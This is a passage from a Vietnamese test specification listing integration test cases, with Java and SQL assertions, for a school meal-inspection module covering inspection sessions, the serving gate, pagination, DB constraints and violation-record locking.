**Implementation Note:** cấu hình `spring.jackson.deserialization.fail-on-unknown-properties=true` **không đủ** — nó bắt được (a) sai tên nhưng **không** bắt (b) đúng tên sai kiểu khi kiểu đích là `String`. Field số phải khai đúng `BigDecimal`/`Integer` trong DTO, và field dẫn xuất phải **vắng mặt hoàn toàn** khỏi Request DTO (không phải `@JsonIgnore` — `@JsonIgnore` im lặng bỏ qua, đúng bẫy đang muốn chặn).

---

### 4.3. INTEGRATION TEST CASES

> Nền: `@SpringBootTest(webEnvironment = RANDOM_PORT)` + **Testcontainers `PostgreSQLContainer("postgres:16-alpine")`** (`FX-029`) + Flyway chạy **THẬT** `V1`…`V11` (MF01…MF06 đã merge) + **`V12`/`V13` của MF07** (`M07-D06` — `V11` đã bị `V11__seed_mf06.sql` lấy) + `V900__test_fixtures.sql`. Timeout khởi động **120s**.
> Test file: `src/test/java/com/sfms/mf07/integration/*IT.java` (Failsafe — `mvn -f 04_Development/Backend/pom.xml verify`). Package **`com.sfms.mf07`** (`M07-D05` — không phải `com.sfms.mf07`).
> ⚠️ **D1:** mọi DB assertion dùng **`WHERE code = ?`** (không phải `WHERE id = ?` — `id` là UUID nội bộ).
> ⚠️ **KHÔNG** dùng `prisma db push`/`prisma.client` như template gốc — assert bằng `JdbcTemplate`/repository.

```java
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@Testcontainers
@ActiveProfiles("test")
abstract class AbstractMf07IT {

    @Container
    static final PostgreSQLContainer<?> POSTGRES =
        new PostgreSQLContainer<>("postgres:16-alpine").withReuse(true);

    @DynamicPropertySource
    static void props(DynamicPropertyRegistry r) {
        r.add("spring.datasource.url",      POSTGRES::getJdbcUrl);
        r.add("spring.datasource.username", POSTGRES::getUsername);
        r.add("spring.datasource.password", POSTGRES::getPassword);
        r.add("spring.flyway.locations",    () -> "classpath:db/migration");
    }

    @Autowired protected MockMvc      mvc;
    @Autowired protected JdbcTemplate jdbc;

    /**
     * Cách ly: xoá dữ liệu MF07 trước MỖI test (chống AP-AI-002 shared state).
     * ⚠️ CHỈ áp cho DB test của Testcontainers. Trên môi trường thật, hồ sơ kiểm thực
     *    là hồ sơ pháp lý QĐ 1246 — CẤM xoá (xem §7 R1).
     */
    @BeforeEach
    void resetMf07() {
        jdbc.execute("""
            TRUNCATE checklist_item_results, checklist_items, checklist_groups,
                     step1_fresh_rows, step1_dry_rows, step2_rows, step3_rows,
                     inspection_evidences, safety_signoffs,
                     kitchen_inspections, inspection_sessions CASCADE
            """);
    }
}
```

---

#### MF07-TC-INT-001 — Happy path trọn phiên: mở → 3 bước → đồng ký

**Severity:** `CRITICAL` · **Legal:** QĐ 1246 Điều 3–5
**Feature Under Test:** `POST /inspections` → `POST /inspections/{code}/steps/{n}` ×3 → `POST /inspections/{code}/co-sign`
**Test File:** `integration/InspectionLifecycleIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-01`, `COND-08`, `COND-31`
**Oracle Source:** `TDS` §13 hàng `IT-07-01` (*"201 → 200 ×3 → 200 (MSG-043); DB `overall=PASSED`, `decided_at` khác null"*) + `TDS` §15.1 (chuỗi curl thật) + **BR-079**, **BR-093**, **BR-098** + **MSG-043**

**Preconditions:** container running; Flyway `V1`…`V11` + `V12`/`V13`; seed `FX-012` (checklist), `FX-030` (menu/dish), `FX-020` (JWT Caterer), `FX-023` (JWT School Admin đồng ký).

**Test Steps:**
1. `POST /api/v1/inspections` — `{meal:"LUNCH", date:"2026-08-05", dish:"...", menuId:"MENU-2026-30"}`.
2. `POST .../steps/1` (Mẫu 1 — nguyên liệu, có `step1Fresh` + `step1Dry`).
3. `POST .../steps/2` (Mẫu 2 — `coreTemp: 82`).
4. `POST .../steps/3` (Mẫu 3 — trước khi ăn).
5. `POST .../co-sign`.
6. Assert DB sau mỗi bước.

**Expected Result (PASS):**
- (1) → **201**; response `"id": "INSP-20260805-L"` (**D1** — `code` dưới tên `id`); DB `overall='IN_PROGRESS'`
- (2)(3)(4) → **200** mỗi bước, message **MSG-043**
- (5) → **200**; DB `overall='PASSED'`, `co_signed_at IS NOT NULL`, `decided_at IS NOT NULL`
- `step1_fresh_rows` + `step1_dry_rows` + `step2_rows` + `step3_rows` có đúng số dòng đã gửi (**4 bảng dòng riêng** — ADR-M07-01)
- BR-093: `menu_id` và `dish_id` khác `null` (hồ sơ hoàn chỉnh)
- Ngày trong response là **ISO** (`"2026-08-05"` — **D4**), `meal` là `"LUNCH"` (**D6**)

**DB Assertion:**
```java
Map<String,Object> row = jdbc.queryForMap("""
    SELECT overall, co_signed_at, decided_at, menu_id, dish_id
      FROM inspection_sessions WHERE code = ?""", code);          // D1: WHERE code
assertThat(row.get("overall")).isEqualTo("PASSED");
assertThat(row.get("co_signed_at")).isNotNull();
assertThat(row.get("decided_at")).isNotNull();
assertThat(row.get("menu_id")).isNotNull();                        // BR-093

assertThat(jdbc.queryForObject(
    "SELECT count(*) FROM step2_rows r JOIN inspection_sessions s ON r.session_id = s.id "
  + "WHERE s.code = ?", Integer.class, code)).isEqualTo(2);
```

**Expected Result (FAIL):**
- `overall=PASSED` mà `co_signed_at` null ⇒ vi phạm BR-098 + QĐ 1246 Điều 5
- Bảng dòng rỗng ⇒ hồ sơ không có mẫu biểu ⇒ bản in Mẫu 1/2/3 trắng, hồ sơ vô giá trị khi thanh tra
- `menu_id` null ⇒ BR-093 không thoả; MF11 không truy vết được sự cố → món

**Current Status:** 🔴 Not written

---

#### MF07-TC-INT-002 — serving-gate MỞ sau khi phiên ĐẠT

**Severity:** `CRITICAL`
**Feature Under Test:** `GET /api/v1/inspections/serving-gate`
**Test File:** `integration/ServingGateIT.java` · **TDD Phase:** 🔴 RED · ⚠️ endpoint **MỚI** (L17/CF-20)
**Condition Ref:** `COND-09` · **Constraint Ref:** `TDS §17.1 C4`
**Oracle Source:** **BR-094** + **BR-098** + `TDS` §13 hàng `IT-07-02` (*"Sau IT-07-01, `GET /serving-gate` → `{allowed:true}`"*) + `TDS` §15.1

**Test Steps:** chạy `MF07-TC-INT-001` rồi `GET /inspections/serving-gate?date=2026-08-05&meal=LUNCH`.

**Expected Result (PASS):**
- **200** `{"allowed": true}`; kèm `sessionCode` để MF09 ghi vết đã hỏi cổng nào
- Rate limit **600/min** (§9.2 #25) — cao nhất trong module vì MF09 gọi mỗi lần phát suất
- Teacher (`FX-024`) **cũng** gọi được (§16: `✅ School`) — giáo viên là người phát suất

**Expected Result (FAIL):** trả `allowed:false` khi phiên đã ĐẠT ⇒ **chặn oan bữa ăn hợp lệ**, học sinh không được ăn đúng giờ.

**Current Status:** 🔴 Not written

---

#### MF07-TC-INT-003 — serving-gate CHẶN: 4 lý do phân biệt được

**Severity:** `CRITICAL`
**Feature Under Test:** `GET /api/v1/inspections/serving-gate`
**Test File:** `integration/ServingGateIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-09` · **Constraint Ref:** `TDS §17.1 C4`
**Oracle Source:** **BR-094** (*"Bữa ăn **không được phục vụ** nếu **bất kỳ bước nào** thất bại"*) + `TDS` §13 hàng `IT-07-03` (*"`{allowed:false, reasonCode:"INSPECTION_FAILED"}`"*) + `TDS` §11.3 bước 6 (*"Expected: `{"allowed": false, "reasonCode": "NO_SESSION", ...}` khi chưa có phiên"*) + **L15/CF-18** (chưa đồng ký)
**Kỹ thuật:** Decision Table Testing (bảng ở `MF07-TC-014`)

**Test Steps:** 4 tình huống DB → `GET /serving-gate`:

| # | Trạng thái DB | Expected |
|---|---|---|
| a | phiên `overall='FAILED'` (`FX-002`) | `{allowed:false, reasonCode:"INSPECTION_FAILED"}` |
| b | phiên `overall='IN_PROGRESS'` (`FX-003`) | `{allowed:false, reasonCode:"INSPECTION_INCOMPLETE"}` |
| c | **không** phiên nào cho (date, meal) | `{allowed:false, reasonCode:"NO_SESSION"}` |
| d | 3 bước PASSED nhưng `co_signed_at IS NULL` | `{allowed:false, reasonCode:"NOT_CO_SIGNED"}` |

**Expected Result (PASS):**
- Đúng 4 hàng, mỗi ca có `reasonCode` **riêng biệt** (MF09 cần thông điệp khác nhau cho giáo viên)
- HTTP **200** ở cả 4 ca (gate là **truy vấn**, không phải lỗi — trả `allowed:false` trong body)
- Điểm bếp thấp **không** xuất hiện trong bất kỳ `reasonCode` nào (C6 — `MF07-TC-014` ca b)

**Expected Result (FAIL):**
- (b) trả `allowed:true` ⇒ phát suất khi kiểm thực **chưa xong** — BR-094 đòi ĐẠT, không phải "chưa trượt"
- (d) trả `allowed:true` ⇒ bỏ qua chữ ký 2 bên
- Trả HTTP 409/403 thay vì 200 + body ⇒ MF09 phải bắt exception cho luồng bình thường, dễ code sai thành "lỗi mạng thì cho phát"

**Current Status:** 🔴 Not written

---

#### MF07-TC-INT-004 — BR-099 scope: Caterer chỉ thấy phiên đơn vị mình

**Severity:** `CRITICAL`
**Feature Under Test:** `GET /api/v1/inspections` + row-level filter
**Test File:** `integration/RowLevelScopeIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-18` · **Constraint Ref:** `TDS §17.1 C8`
**Oracle Source:** **BR-099** + `TDS` §13 hàng `IT-07-08` (*"Caterer A `GET /inspections` → chỉ phiên `partner_id = A`"*) + `TDS` §16

**Preconditions:** seed 5 phiên `SUP-001` (`FX-001`…`FX-004`) + 3 phiên `SUP-002` (`FX-005`).

**Test Steps:** `GET /inspections?pageSize=100` bằng `FX-020` (SUP-001) · `FX-021` (SUP-002) · `FX-022` (Medical) · `FX-023` (School Admin).

**Expected Result (PASS):**
- SUP-001 → `total == 5`, mọi item có `partner_id = SUP-001`
- SUP-002 → `total == 3`
- Medical → `total == 8` (toàn trường — BR-099)
- School Admin → `total == 8`
- Filter áp ở **Specification** (assert SQL chứa `partner_id = ?` qua log `org.hibernate.SQL`), không phải lọc sau khi load

**Expected Result (FAIL):** Caterer thấy `total == 8` ⇒ **rò dữ liệu chéo giữa nhà cung cấp** (D1 nêu `partnerId` là khoá cách ly).

**Current Status:** 🔴 Not written

---

#### MF07-TC-INT-005 — Hợp đồng phân trang: 5 field, clamp page, tập rỗng vẫn 200

**Severity:** `HIGH`
**Feature Under Test:** `GET /api/v1/inspections` + `PagedResponse.of()`
**Test File:** `integration/PaginationContractIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-27`
**Oracle Source:** `00_Team_Work_Assignment_Plan.md` **§2b-1** (5 field, không wrapper) + **§2b-6** (clamp `page`; tập rỗng → 200; `pageSize` ≤ 0 → clamp 1) + `TDS` §13 hàng `IT-07-04`, `IT-07-05` + `TDS` §14.3 (*"Expected: `["items","page","pageCount","pageSize","total"]`"*)
**Kỹ thuật:** Boundary Value Analysis

**Preconditions:** seed **20** phiên cùng trường.

**Test Steps:** `?page=999&pageSize=8` · `?pageSize=0` · `?pageSize=-5` · *(không param)* · `?dateFrom=2099-01-01` (tập rỗng).

**Expected Result (PASS):**
- `page=999` → **200**, `pageCount == 3`, **`page == 3`** (clamp), `items.size() == 4`
- `pageSize` ∈ {0, −5} → clamp về **1**; không 500, không chia cho 0
- Không param → `page=1`, `pageSize=8`
- Tập rỗng → **200** `{"items":[],"total":0,"page":1,"pageSize":8,"pageCount":1}` — **không 404**, `pageCount` là **1**
- Khoá JSON đúng 5 và **sắp được**: `["items","page","pageCount","pageSize","total"]` (§14.3)
- **Không** wrapper `data`/`result`

**Expected Result (FAIL):**
- Thiếu 1 field ⇒ `Paged<T>` của `client.ts` không parse được → mọi màn danh sách MF07 gãy
- 404 khi rỗng ⇒ `usePagedList` coi là lỗi mạng, màn hiện lỗi thay vì "không có kết quả"

**Current Status:** 🔴 Not written
**Implementation Note:** `PagedResponse` là **nền chung** của Nam (`00_` §2b-4) — TC này dùng lại được cho 12 module khác.

---

#### MF07-TC-INT-006 — PUT partial merge trên DB thật: không mất bảng dòng

**Severity:** `CRITICAL`
**Feature Under Test:** `PUT /api/v1/inspections/{code}` + `orphanRemoval`
**Test File:** `integration/PartialMergeIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-20` · **Constraint Ref:** `TDS §17.1 C9`
**Oracle Source:** `TDS` §17.1 **C9** + §9.0 + `mock-server.ts:354` — bản integration của `MF07-TC-028` (unit), cần riêng vì `orphanRemoval` **chỉ** biểu hiện ở tầng JPA/DB

**Preconditions:** phiên có 3 `step1_fresh_rows`, 2 `step1_dry_rows`, 2 `step2_rows`, 2 `inspection_evidences`.

**Test Steps:**
1. Đếm dòng từng bảng (snapshot).
2. `PUT` body **chỉ** `{"staffNotes":"ghi chú mới"}`.
3. Đếm lại.
4. `PUT` body chỉ `{"step2":"PASSED"}` → đếm lại.

**Expected Result (PASS):**
- Số dòng **không đổi** ở cả 4 bảng sau (2) và (4)
- `staff_notes` đổi; `inspector`, `dish`, `meal`, `menu_id` **không** null
- `inspection_evidences` vẫn 2 dòng (ảnh bằng chứng BR-083 không mất)

**DB Assertion:**
```java
int before = countRows("step2_rows", code);
mvc.perform(put("/api/v1/inspections/{code}", code).content("{\"staffNotes\":\"x\"}")...)
   .andExpect(status().isOk());
assertThat(countRows("step2_rows", code)).isEqualTo(before);          // KHÔNG bị orphanRemoval
assertThat(countRows("inspection_evidences", code)).isEqualTo(2);     // BR-083
```

**Expected Result (FAIL):** bảng dòng về 0 ⇒ **một request cập nhật ghi chú xoá sạch mẫu biểu kiểm thực** — hồ sơ pháp lý bị huỷ nội dung âm thầm.

**Current Status:** 🔴 Not written

---

#### MF07-TC-INT-007 — Filter: dateFrom/dateTo trên cột date + step/stepStatus + search

**Severity:** `MEDIUM`
**Feature Under Test:** `InspectionSpec.build()`
**Test File:** `integration/InspectionFilterIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-28`, `COND-29`
**Oracle Source:** `00_` **§2b-5** (bảng resource → field ngày: `inspections` → cột **`date`**, `LocalDate`) + **§2b-2** (`step`|`stepStatus`) + **§2b-3** (thứ tự áp lọc; `search` **cuối**, chỉ trên `SEARCH_FIELDS`) + `TDS` §9.2 (*"`SEARCH_FIELDS`: `inspections` = `{inspector, dish, staffNotes}`"*) + `TDS` §13 hàng `IT-07-06`, `IT-07-07`
**⚠️ Logic Issue:** **CF-17** — cặp `step`+`stepStatus` **không có call-site nào** ở FE (FE lọc bằng `overall`). Backend **vẫn phải hỗ trợ** theo hợp đồng chung; TC này là bằng chứng hợp đồng được tôn trọng, đồng thời TDS đề nghị sửa `00_` §2b-2 ghi rõ *"chưa có FE dùng"*.

**Test Steps:**
1. `?dateFrom=2026-07-01&dateTo=2026-07-31`.
2. `?step=2&stepStatus=FAILED`.
3. `?search=Hùng` (khớp `inspector`).
4. `?search=Basa` (khớp `dish`, khác chữ hoa/thường).
5. `?search=<chuỗi chỉ có trong cột reject/lý do>`.
6. `?not:overall=PASSED`.

**Expected Result (PASS):**
- (1) → chỉ phiên có `date` trong khoảng; so trên cột **`date`** (§2b-5), không phải `created_at`
- (2) → chỉ phiên `step2='FAILED'` (khớp `FX-002`)
- (3)(4) → khớp, **case-insensitive** (`cb.like(cb.lower(...))`)
- (5) → `total == 0` — chứng minh `search` **không** quét mọi cột String (chỉ 3 cột `SEARCH_FIELDS`)
- (6) → không item nào `overall='PASSED'`
- Thứ tự áp lọc đúng §2b-3: exact/not → khoảng ngày → step/stepStatus → search **cuối**

**Expected Result (FAIL):**
- (5) khớp ⇒ full table scan + rò rỉ nội dung nội bộ qua tìm kiếm
- (1) so trên `created_at` ⇒ phiên nhập muộn bị lọc sai kỳ, báo cáo tuân thủ sai số

**Current Status:** 🔴 Not written

---

#### MF07-TC-INT-008 — CAPA tự tạo trong cùng transaction (BR-095)

**Severity:** `CRITICAL`
**Feature Under Test:** `POST /inspections/{code}/steps/2` (trượt) → CAPA
**Test File:** `integration/InspectionCapaIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-06` · **Constraint Ref:** `TDS §17.1 C3, C13`
**Oracle Source:** **BR-095** + `TDS` §7.1 (event catalog) + **L12/CF-14**

**Test Steps:**
1. `POST .../steps/2` với `coreTemp: 68` — **không** gọi API CAPA nào.
2. Truy vấn bảng CAPA (MF11).
3. Mô phỏng FE cũng gọi `POST /corrective-actions` cùng phiên+bước.
4. Gây lỗi giả sau khi ghi bước (inject exception) → kiểm rollback đồng bộ.

**Expected Result (PASS):**
- (2) → **1** CAPA với `source_inspection_code = <code>`, `step = 2`, trạng thái mở
- `step2 = 'FAILED'` **và** CAPA cùng tồn tại (cùng transaction)
- (3) → **vẫn 1** CAPA (idempotency theo `(source_inspection_code, step)`)
- (4) → **cả hai** rollback: không có `step2=FAILED` mồ côi, cũng không có CAPA mồ côi

**DB Assertion:**
```java
assertThat(jdbc.queryForObject("""
    SELECT count(*) FROM corrective_actions
     WHERE source_inspection_code = ? AND step = 2""", Integer.class, code)).isEqualTo(1);
```

**Expected Result (FAIL):**
- 0 CAPA ⇒ BR-095 mất hiệu lực (lỗ hổng L12 đang tồn tại: FE đóng tab là mất CAPA)
- 2 CAPA ⇒ nhân đôi việc cho MF11, sai số liệu tuân thủ
- CAPA tồn tại mà bước bị rollback ⇒ CAPA mồ côi trỏ vào phiên "sạch"

**Current Status:** 🔴 Not written
**Implementation Note:** ranh giới module — MF07 **phát event/gọi port**; bảng `corrective_actions` thuộc **MF11**. TC này assert qua DB vì cả hai chạy cùng schema; khi MF11 tách service thì đổi sang assert message trên outbox.

---

#### MF07-TC-INT-009 — Kiểm bếp điểm 55: FAILED + MSG-093 + event, KHÔNG khóa bếp

**Severity:** `HIGH`
**Feature Under Test:** `POST /api/v1/kitchen-inspections`
**Test File:** `integration/KitchenInspectionIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-10`, `COND-11` · **Constraint Ref:** `TDS §17.1 C6, C11`
**Oracle Source:** `ADR-M07-03` + **MSG-093** + `TDS` §13 hàng `IT-07-09` (*"201, `result=FAILED`, warning MSG-093, có event `KitchenScoreBelowThreshold`"*) + **L6/CF-2**, **L21/CF-26**

**Test Steps:**
1. `POST /kitchen-inspections` với `itemResults` 11/20 đạt **và** `score: 100` (sai lệch cố ý).
2. Đọc DB + response.
3. `GET /inspections/serving-gate` cho bữa cùng ngày (phiên kiểm thực PASSED).
4. Kiểm không có bảng/cột trạng thái "khóa bếp".

**Expected Result (PASS):**
- (1) → **201**
- (2) → DB `score = 55` (**tính lại**, không phải 100), `result = 'FAILED'`; response có warning **MSG-093**; event `KitchenScoreBelowThreshold` phát
- (3) → **`allowed: true`** — điểm bếp thấp **không** chặn phát suất (C6, `MF07-TC-014` ca b)
- (4) → không tồn tại cột/bảng khóa bếp:
  ```sql
  SELECT column_name FROM information_schema.columns
   WHERE table_name = 'kitchen_inspections' AND column_name ILIKE '%quarantine%';
  -- Expected: 0 rows
  ```
- `staff_health_valid = false` được lưu (BR-103) nhưng **không** tự chặn gì

**Expected Result (FAIL):**
- `score = 100` ⇒ đơn vị bị kiểm tự chấm điểm (L21)
- `allowed: false` ⇒ khôi phục hành vi **đã descope**, học sinh không có bữa ăn
- Có cột quarantine ⇒ implement lại UC-014 AF1 đã bỏ

**Current Status:** 🔴 Not written

---

#### MF07-TC-INT-010 — Checklist soft-delete: dữ liệu lịch sử còn nguyên

**Severity:** `HIGH`
**Feature Under Test:** `DELETE /api/v1/checklist-groups/{code}`
**Test File:** `integration/ChecklistLifecycleIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-17` · **Constraint Ref:** `TDS §17.1 C14`
**Oracle Source:** **BR-210** + **MSG-094** + `ADR-M12-06` + **L13/CF-15**

**Test Steps:**
1. Seed `FX-012` + 1 phiên kiểm bếp có `checklist_item_results` trỏ `CLG-3`.
2. `DELETE /checklist-groups/CLG-3` → assert.
3. Gọi lại `?confirmed=true` → assert.
4. Đọc phiên cũ; tạo phiên mới.

**Expected Result (PASS):**
- (2) → **409** + MSG-094; `is_active` **vẫn true**
- (3) → **200**; `is_active = false`
- `checklist_item_results` giữ **nguyên số dòng** (không CASCADE DELETE):
  ```sql
  SELECT count(*) FROM checklist_item_results r
    JOIN checklist_items i ON r.item_id = i.id
    JOIN checklist_groups g ON i.group_id = g.id WHERE g.code = 'CLG-3';
  -- Expected: giữ nguyên số dòng trước khi xoá
  ```
- (4) → phiên cũ **vẫn** render đủ mục; phiên **mới** không còn nhóm đã ẩn
- **Không** câu `DELETE FROM checklist_groups` nào chạy (assert qua log SQL)

**Expected Result (FAIL):** xoá cứng + CASCADE ⇒ **phiên kiểm bếp lịch sử mất mục** ⇒ hồ sơ định kỳ tháng (BR-101) không tái tạo được.

**Current Status:** 🔴 Not written

---

#### MF07-TC-INT-011 — Biên bản: tạo → export PDF → ảnh ký → KHOÁ

**Severity:** `CRITICAL` · **Legal:** BR-211 + mẫu `specialreport2173_1.md`
**Feature Under Test:** `POST /violations` → `POST /violations/{code}/export-pdf` → `POST .../signed-record` → `PUT` (phải 409)
**Test File:** `integration/ViolationLifecycleIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-15`, `COND-16` · **Constraint Ref:** `TDS §17.1 C7`
**Oracle Source:** **BR-211** + `ADR-M07-05` (append-only) + **MSG-086**, **MSG-095** + `TDS` §13 hàng `IT-07-11` (*"201 → 200 → 200 `locked:true`; PUT sau đó → 409"*) + **L18/CF-21**, **L22/CF-30**

**Test Steps:**
1. `POST /violations` đúng BR-183 (có `caterersRepresentativeId`, mô tả, ảnh) → assert 201 + MSG-086.
2. `PUT {"resolution":"PENDING_APPROVAL"}` **trước** khi có ảnh ký → assert.
3. `POST .../export-pdf` → assert PDF.
4. `POST .../signed-record` (upload ảnh) → assert.
5. `PUT {"description":"đổi nội dung"}` sau khi khoá → assert.
6. Kiểm `audit_logs`.

**Expected Result (PASS):**
- (1) → **201**, `resolution='PENDING'`, message MSG-086
- (2) → **409 `VIO-095`** (gate L22 — server-side, không chỉ disable nút)
- (3) → **200**; file PDF thật (`%PDF-` header), `pdf_exported=true`, `pdf_generated_at` set
- (4) → **200**, `locked: true`; `signed_record_photo_url` + `signed_record_sha256` set
- (5) → **409** (append-only ADR-M07-05); DB cột `description` **không** đổi
- (6) → mọi thay đổi sau khoá ghi **thêm** dòng `audit_logs` (BR-188), không update tại chỗ
- Sau (4): `PUT {"resolution":"PENDING_APPROVAL"}` → **200** (đã có ảnh ký)

**Expected Result (FAIL):**
- (2) trả 200 ⇒ biên bản gửi duyệt không có bản ký tay 2 bên ⇒ văn bản vô hiệu
- (5) trả 200 ⇒ nội dung biên bản đã ký bị sửa sau lưng 2 bên ⇒ mất giá trị chứng cứ, vi phạm BR-188

**Current Status:** 🔴 Not written

---

#### MF07-TC-INT-012 — CHECK constraint tầng DB: ngưỡng nhiệt độ + bằng chứng

**Severity:** `CRITICAL`
**Feature Under Test:** CHECK constraints trong `V12__mf07_inspection.sql`
**Test File:** `integration/DbConstraintIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-02`, `COND-05` · **Constraint Ref:** `TDS §17.1 C2, C5` (*"Enforce ở **cả** service **và** CHECK constraint"*)
**Oracle Source:** **BR-090**, **BR-091**, **BR-083** + `TDS` §11.3 bước 4 (*"Kiểm tra CHECK constraint quan trọng đã lên"*) + `TDS` §13 hàng `UT-07-07` (`ck_s1f_evidence`), `UT-07-15` (`ck_cir_evidence`)
**Kỹ thuật:** Constraint-based Testing (ghi **trực tiếp** qua `JdbcTemplate`, **bỏ qua** service)

**Test Steps:** `INSERT`/`UPDATE` trực tiếp bằng `jdbc` để lách service:
1. `step2_rows` với `core_temp = 68` và `result='PASSED'`.
2. `step1_fresh_rows` với `sensory_pass=false`, `photo_count=0`.
3. `checklist_item_results` với `passed=false`, `reason=NULL`.
4. `inspection_sessions` với `overall='DONE'` (giá trị ngoài enum).
5. Giá trị hợp lệ.

**Expected Result (PASS):**
- (1)(2)(3)(4) → `DataIntegrityViolationException`; tên constraint xuất hiện trong message
- (4) → CHECK cột `overall` chấp nhận đúng **4** giá trị `{PENDING, PASSED, FAILED, IN_PROGRESS}` (CF-23 — `IN_PROGRESS` đã được bổ sung); 3 cột `step*` chỉ **3** giá trị
- (5) → INSERT thành công
- Constraint tồn tại thật:
  ```sql
  SELECT conname FROM pg_constraint
   WHERE conname IN ('ck_s1f_evidence','ck_cir_evidence','ck_insp_overall');
  -- Expected: 3 rows
  ```

**Expected Result (FAIL):**
- Ghi được ⇒ **lớp phòng vệ thứ hai không tồn tại**; một script migration/sửa dữ liệu tay có thể tạo phiên "PASSED với 68°C" mà service không biết. C2 nói rõ phải enforce ở **cả hai** tầng.

**Current Status:** 🔴 Not written

---

#### MF07-TC-INT-013 — ck_insp_holding_temp phải ở trạng thái CHƯA enable

**Severity:** `MEDIUM`
**Feature Under Test:** trạng thái CHECK constraint `ck_insp_holding_temp`
**Test File:** `integration/DbConstraintIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-03`
**Oracle Source:** `TDS` §5.2 nguyên văn — *"giữ cột `holding_temp` nhưng **ghi rõ chỉ ENABLE `ck_insp_holding_temp` sau khi Minh bổ sung ô nhập** — bật ngay sẽ chặn mọi phiên hợp lệ"* + **L19/CF-24**

**Test Steps:**
1. Truy vấn `pg_constraint` tìm `ck_insp_holding_temp`.
2. `INSERT` phiên với `holding_temp = NULL` (trạng thái hiện tại của FE).

**Expected Result (PASS):**
- (1) → constraint **chưa tồn tại** (hoặc tồn tại ở dạng `NOT VALID`) — TC ghi rõ lựa chọn để Mạnh implement nhất quán
- (2) → **thành công** (không bị chặn)
- Có comment/TODO trong `V12` trỏ CF-24 để người sau biết vì sao chưa bật

**Expected Result (FAIL):** constraint đã enable ⇒ **mọi phiên kiểm thực của FE hiện tại bị chặn** vì `Step3Row` không có ô nhập `holdingTemp` — đúng hậu quả L19 cảnh báo. Đây là TC **bảo vệ khỏi việc implement quá sớm**.

**Current Status:** 🔴 Not written
**Implementation Note:** khi Minh bổ sung ô nhập → migration **mới** (`V15+`) enable constraint; **không** sửa `V12` đã chạy. Đồng thời bỏ `@Disabled` ở `MF07-TC-005`.

---

#### MF07-TC-INT-014 — Tái kiểm tra: phiên mới, phiên cũ bất biến (DB level)

**Severity:** `HIGH`
**Feature Under Test:** `POST /api/v1/inspections/{code}/reinspect`
**Test File:** `integration/ReinspectionIT.java` · **TDD Phase:** 🔴 RED · ⚠️ endpoint MỚI (L16/CF-19)
**Condition Ref:** `COND-07` · **Constraint Ref:** `TDS §17.1 C3`
**Oracle Source:** **BR-096** + **MSG-056** + `TDS` §4.2 + `TDS` §13 hàng `UT-07-09`

**Test Steps:**
1. Snapshot **toàn bộ hàng** phiên `FX-002` (`FAILED`) + tất cả bảng dòng (dùng `SELECT *`, so map).
2. `POST .../reinspect`.
3. So snapshot; kiểm phiên mới.

**Expected Result (PASS):**
- Phiên mới: `code` khác, `overall='IN_PROGRESS'`, 3 bước `PENDING`, `reinspects_code = <code cũ>`
- Kế thừa `date`, `meal`, `dish`, `menu_id`, `partner_id`
- **Phiên cũ giống hệt snapshot từng cột**, kể cả `updated_at`
- Bảng dòng của phiên cũ **không** bị copy sang phiên mới (phiên mới phải nhập lại — đúng nghĩa "tái kiểm tra")
- Warning MSG-056

**Expected Result (FAIL):** phiên cũ bị reset/sửa ⇒ **xoá bằng chứng bước trượt**; thanh tra không thấy đã từng vi phạm; vi phạm §4.2.

**Current Status:** 🔴 Not written

---

#### MF07-TC-INT-015 — Bảng fridge_temp_logs KHÔNG được tạo

**Severity:** `LOW`
**Feature Under Test:** schema `V12`
**Test File:** `integration/SchemaShapeIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-39`
**Oracle Source:** **L8/CF-4** — `FridgeTempLog` còn trong `data_model.puml` nhưng **BR-089 Deprecated 11/07/2026** và không có resource trong `db.ts` ⇒ TDS chốt *"**Không** tạo bảng `fridge_temp_logs` ở MVP"* + **L9/CF-5** (không bảng nhật ký côn trùng)

**Expected Result (PASS):**
```sql
SELECT table_name FROM information_schema.tables
 WHERE table_name IN ('fridge_temp_logs','pest_control_logs');
-- Expected: 0 rows
```
- Cột `pest_control_valid` **vẫn** tồn tại trên `kitchen_inspections` (L9 — màn School Admin đọc)

**Expected Result (FAIL):** bảng tồn tại ⇒ implement cơ chế **đã deprecated**; schema phình và `data_model.puml` càng lệch xa thực tế.

**Current Status:** 🔴 Not written
**Implementation Note:** TC này là **regression guard** — nhắc Mạnh cập nhật `data_model.puml` (L8) chứ không phải thêm bảng để "khớp puml".

---

#### MF07-TC-INT-016 — D1: JSON id là code, PK là UUID

**Severity:** `HIGH`
**Feature Under Test:** định danh toàn module
**Test File:** `integration/IdentityContractIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-21` · **Constraint Ref:** **`00_Common_Conventions.md` D1**
**Oracle Source:** **D1** — *"**Path param** dùng `code`… **Khóa ngoại trong JSON** dùng `code` của bảng đích… **Khóa ngoại trong DB** vẫn là `UUID REFERENCES ...`"* + `@JsonProperty("id") getPublicId()` + **L1**

**Test Steps:**
1. `POST /inspections` → đọc response.
2. `GET /inspections/INSP-20260805-L` (path bằng **code**).
3. Kiểm schema DB.
4. Kiểm khóa ngoại trong JSON.
5. `GET /inspections/{UUID}` (thử path bằng UUID).

**Expected Result (PASS):**
- (1) → response có `"id": "INSP-20260805-L"`; **không** field `code` riêng, **không** lộ UUID
- (2) → **200**
- (3) → `inspection_sessions.id` là **`uuid`**; có cột `code varchar(32) NOT NULL`; có `UNIQUE(school_id, code)`:
  ```sql
  SELECT data_type FROM information_schema.columns
   WHERE table_name='inspection_sessions' AND column_name='id';
  -- Expected: uuid
  SELECT conname FROM pg_constraint WHERE conname LIKE '%inspection_sessions%code%';
  -- Expected: >= 1 row (UNIQUE(school_id, code))
